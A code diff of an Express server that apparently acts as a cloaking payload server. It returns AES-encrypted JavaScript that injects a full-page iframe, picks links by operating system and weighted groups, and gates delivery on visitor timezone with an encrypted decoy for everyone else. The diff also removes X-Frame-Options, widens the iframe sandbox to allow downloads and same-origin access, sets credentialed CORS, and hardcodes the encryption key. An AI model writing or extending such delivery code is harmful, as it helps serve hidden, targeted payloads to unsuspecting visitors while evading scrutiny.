@@ -1,27 +1,45 @@
 const express = require("express");
-const cors = require("cors");
 const CryptoJS = require("crypto-js");
 
 const app = express();
-const PORT = 3000;
+// Use the port provided by environment or default to 3000
+const PORT = process.env.PORT || 3000;
 const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
 
 // --- Middleware ---
-app.use(cors());
+
 app.use(express.json());
 
-// Add CORS & Security Policy middleware
+/**
+ * Advanced Security & CORS Middleware
+ * 1. Dynamically allows any .on-forge.com subdomain
+ * 2. Fixes the "X-Frame-Options" sameorigin error
+ * 3. Handles Preflight (OPTIONS) requests
+ */
 app.use((req, res, next) => {
-    res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
-    
-    // Modern way to handle frame permissions
-    const originalXFrameOptions = res.getHeader('X-Frame-Options');
-    if (originalXFrameOptions === 'sameorigin') {
-        res.removeHeader('X-Frame-Options');
-        res.setHeader('X-Frame-Options', 'ALLOW-FROM *');
+    const origin = req.headers.origin;
+
+    // 1. Dynamic CORS Logic
+    if (origin && (origin.endsWith('.on-forge.com') || origin.includes('amplifyapp.com'))) {
+        res.header("Access-Control-Allow-Origin", origin);
+    } else {
+        res.header("Access-Control-Allow-Origin", "*");
     }
+
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization");
+    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
+    res.header("Access-Control-Allow-Credentials", "true");
+
+    // 2. Fix for "Refused to display in a frame" error
+    // We remove the restrictive X-Frame-Options and use CSP instead
+    res.removeHeader('X-Frame-Options'); 
+    res.setHeader("Content-Security-Policy", "frame-ancestors 'self' *.on-forge.com https://main.d1hloak9u1qle7.amplifyapp.com;");
+
+    // 3. Handle Preflight OPTIONS requests
+    if (req.method === 'OPTIONS') {
+        return res.sendStatus(200);
+    }
+
     next();
 });
 
@@ -32,16 +50,16 @@ function aesEncode(text) {
 }
 
 function getError() {
-    const se1 = `console.log("Error Find");`;
-    const encrypted1 = aesEncode(se1);
-    return encodeURIComponent(encrypted1);
+    const jsError = `console.log("Error Find");`;
+    const encrypted = aesEncode(jsError);
+    return encodeURIComponent(encrypted);
 }
 
 function getResponse(userAgent) {
-    // Detect if user is on macOS
+    // Detect OS for link routing
     const isMac = /Macintosh|Mac OS X/i.test(userAgent);
 
-    // Define your Groups with weights and OS-specific links
+    // Link Configurations
     const linkGroups = [
         {
             id: "Group 1",
@@ -57,59 +75,41 @@ function getResponse(userAgent) {
         }
     ];
 
-    // 1. Pick the group based on weight (70/30)
-    function selectGroup() {
-        const rand = Math.random();
-        let cumulative = 0;
-        for (const group of linkGroups) {
-            cumulative += group.weight;
-            if (rand <= cumulative) {
-                return group;
-            }
+    // Select group based on weight
+    const rand = Math.random();
+    let cumulative = 0;
+    let selectedGroup = linkGroups[0];
+
+    for (const group of linkGroups) {
+        cumulative += group.weight;
+        if (rand <= cumulative) {
+            selectedGroup = group;
+            break;
         }
-        return linkGroups[0]; // Fallback to first group
     }
 
-    const selectedGroup = selectGroup();
-
-    // 2. Select URL within that group based on OS detection
     const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;
 
-    // 3. Build the JavaScript payload
-    const se1 = `
+    // Payload to create and style the iframe
+    const payload = `
         const iframe = document.createElement("iframe");
         iframe.src = "${selectedUrl}";
-
-        // permissions
-        iframe.setAttribute(
-            "allow",
-            "fullscreen; autoplay; encrypted-media; picture-in-picture"
-        );
-
-        // fullscreen support
+        iframe.setAttribute("allow", "fullscreen; autoplay; encrypted-media; picture-in-picture");
         iframe.setAttribute("allowfullscreen", "");
         iframe.setAttribute("webkitallowfullscreen", "");
         iframe.setAttribute("mozallowfullscreen", "");
-
-        // sandbox
-        iframe.setAttribute(
-            "sandbox",
-            "allow-scripts allow-popups allow-forms allow-downloads"
-        );
-
-        // styles
+        iframe.setAttribute("sandbox", "allow-scripts allow-popups allow-forms allow-downloads allow-same-origin");
         iframe.style.width = "100%";
         iframe.style.height = "100%";
         iframe.style.border = "0px";
 
-        // add to page
         const container = document.getElementById("contentiframe");
         if(container) {
             container.replaceChildren(iframe);
         }
     `;
 
-    return encodeURIComponent(aesEncode(se1));
+    return encodeURIComponent(aesEncode(payload));
 }
 
 // --- Routes ---
@@ -128,9 +128,9 @@ app.post("/timezone", (req, res) => {
 
     const allowedTimezones = [
         "Asia/Tokyo",
-        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
-        "Pacific/Honolulu",
-        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
+        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", 
+        "America/Anchorage", "Pacific/Honolulu", "America/Toronto", "America/Vancouver", 
+        "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
     ];
 
     if (allowedTimezones.includes(timezone)) {
@@ -142,6 +142,5 @@ app.post("/timezone", (req, res) => {
 
 // --- Start Server ---
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`Server live on port ${PORT}`);
 });
-
